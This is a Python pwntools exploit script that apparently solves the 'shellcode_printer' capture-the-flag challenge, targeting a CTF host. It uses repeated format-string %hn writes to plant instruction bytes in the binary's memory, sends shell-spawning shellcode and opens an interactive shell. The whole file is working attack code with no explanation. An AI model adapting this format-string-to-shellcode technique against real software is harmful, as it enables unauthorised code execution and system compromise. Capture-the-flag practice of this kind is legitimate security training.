#!/usr/bin/env python3

from pwn import *

exe = ELF('shellcode_printer', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sn = lambda p, num: p.send(str(num).encode())
sna = lambda p, msg, num: p.sendafter(msg, str(num).encode())
sln = lambda p, num: p.sendline(str(num).encode())
slna = lambda p, msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # brva 0x145B
        brva 0x143F

        c
        ''')
        input()


if args.REMOTE:
    p = remote('shellcode-printer.nc.jctf.pro', 1337)
else:
    p = process([exe.path])
GDB()
push_rdx = asm("jmp $-10")
push_rdx = u16(push_rdx)
push_rdx_pop_rsi = 0x5e52
push_rax_pop_rax = 0x5f50
pop_rdi = 0x5f
push_r11 = 0x5341
pop_rdx = 0x905a
syscall = 0x050f
shellcode = asm(shellcraft.sh())
sla(p, b"string: ", f"%{push_rdx_pop_rsi}c%6$hn")
sla(p, b"string: ", f"%{push_rax_pop_rax}c%6$hn")
sla(p, b"string: ", f"%{push_r11}c%6$hn")
sla(p, b"string: ", f"%{pop_rdx}c%6$hn")
sla(p, b"string: ", f"%{syscall}c%6$hn")
sla(p, b"string: ", f"%{push_rdx}c%6$hn")    

sla(p, b"string: ", b"")
sl(p, shellcode)

p.interactive()
